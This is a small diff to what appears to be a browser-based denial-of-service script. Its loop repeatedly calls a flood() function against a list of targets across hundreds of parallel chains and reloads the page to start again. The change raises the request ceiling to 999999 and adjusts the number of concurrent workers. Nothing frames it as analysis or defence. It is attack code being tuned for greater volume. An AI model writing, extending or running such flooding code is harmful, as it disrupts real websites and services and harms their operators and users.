@@ -57,18 +57,18 @@ setTimeout(() => {
   }
 
   function run() {
-    if (id === 500000) {
+    if (id === 999999) {
       setTimeout(() => location.reload(), 60000)
     } else {
       id++;
 
-      if (id < 500000) {
+      if (id < 999999) {
         flood(targets[id % targets.length], id).finally(run)
       }
     }
   }
 
-  for (let i = 0; i < 777; i++) {
+  for (let i = 0; i < 666; i++) {
     run();
   }
 
